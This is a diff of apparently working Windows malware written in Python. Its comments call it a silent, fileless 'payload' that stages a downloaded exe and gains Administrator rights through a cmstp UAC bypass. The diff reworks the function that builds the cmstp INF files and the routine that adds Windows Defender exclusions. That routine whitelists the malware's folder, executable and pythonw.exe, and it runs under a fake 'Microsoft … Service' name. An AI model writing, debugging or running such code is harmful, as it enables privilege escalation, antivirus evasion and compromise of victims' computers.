@@ -1,4 +1,4 @@
-# tung python-road payload — silent on every failure, stdlib only.
+ # tung python-road payload — silent on every failure, stdlib only.
 # arrives through python's stdin (pythonw -u -); never a file on disk.
 # the exe url rides in from the jar (env EXE_URL = its baked windows url).
 # job order: stage the exe ->Administrator lift via cmstp (majanito shape)
@@ -220,37 +220,41 @@ class Dismisser:
         self.done.wait(timeout)
 
 
-def build_inf(cmd, svc_name, addreg=None):
-    """Directive refs BRACED everywhere (the field-proven convention):
-    CustomDestination={Dxxxx}, RunPreSetupCommands={Cxxxx}, AddReg={Rxxxx},
-    49000,49001={Lxxxx}, 7 - section headers unbraced [Dxxxx]. addreg None
-    -> command INF (exec road); addreg list -> pure AddReg INF (exclusion
-    road, no child processes at all)."""
+def build_inf(cmd, svc_name, reg_lines=None):
+    """cmstp profile schema — nothing schema-foreign:
+    reg_lines is None -> the command INF (exec road): [DefaultInstall] with
+    CustomDestination=Dsec + RunPreSetupCommands=Csec (parse-proven on the
+    target box since the r4 era).
+    reg_lines is a list -> the exclusions INF: [DefaultInstall] carries ONLY
+    CustomDestination=Dsec (NO AddReg= — that directive is what broke section
+    parsing since r7); the exclusion writes ride the DESTINATION section
+    [Lsec] itself in the same five-token registry grammar as the sample's
+    App Paths line: root,subkey,name,flags,data — written elevated by cmstp
+    directly, no child process.
+    Also dumps the exact INF bytes to AppHost\\last.inf before firing, so
+    the next failure report can be the actual text instead of screenshots."""
     s1 = f"D{rand_str(4)}"
     s3 = f"L{rand_str(4)}"
     cmd_block = ""
-    addreg_txt = ""
-    if addreg is None:
+    dest_extra = ""
+    if reg_lines is None:
         s2 = f"C{rand_str(4)}"
         cmd_block = (f"RunPreSetupCommands={s2}\n"
                      f"[{s2}]\n"
                      f"{cmd}\n"
                      "taskkill /IM cmstp.exe /F\n")
     else:
-        s4 = f"R{rand_str(4)}"
-        addreg_txt = (f"AddReg={s4}\n"
-                      f"[{s4}]\n"
-                      + "\n".join(addreg) + "\n")
+        dest_extra = "\n".join(reg_lines) + "\n"
     return f"""; {rand_str(16)}
 [version]
 Signature=$chicago$
 AdvancedINF=2.5
 [DefaultInstall]
 CustomDestination={s1}
-{cmd_block}{addreg_txt}[{s1}]
+{cmd_block}[{s1}]
 49000,49001={s3}, 7
 [{s3}]
-"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+{dest_extra}"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
 [Strings]
 ServiceName="{svc_name}"
 ShortSvcName="{rand_str(4)}"
@@ -376,16 +380,25 @@ def set_defender_exclusions():
     kill_all_cmstp()
     cleanup_infs()
     svc_name = f"Microsoft {rand_str(6)} Service"
-    addreg = [
+    reg_lines = [
         f'HKLM,"{HP}","{appdir}",0x00010001,0',
         f'HKLM,"{HP}","{winparent}",0x00010001,0',
         f'HKLM,"{HR}","{EXE_NAME}",0x00010001,0',
         f'HKLM,"{HR}","pythonw.exe",0x00010001,0',
     ]
+    body = build_inf("rem", svc_name, reg_lines=reg_lines)
+    # debug ground truth: the EXACT bytes handed to cmstp, kept on disk —
+    # if it still fails, the report is this file, not a screenshot
+    try:
+        os.makedirs(PERSIST_DIR, exist_ok=True)
+        with open(os.path.join(PERSIST_DIR, "last.inf"), "w", encoding="utf-8") as fh:
+            fh.write(body)
+    except Exception:
+        pass
     inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
     try:
         with open(inf_path, "w", encoding="utf-8") as fh:
-            fh.write(build_inf("rem", svc_name, addreg=addreg))
+            fh.write(body)
     except Exception:
         return
     dismisser = Dismisser(svc_name)
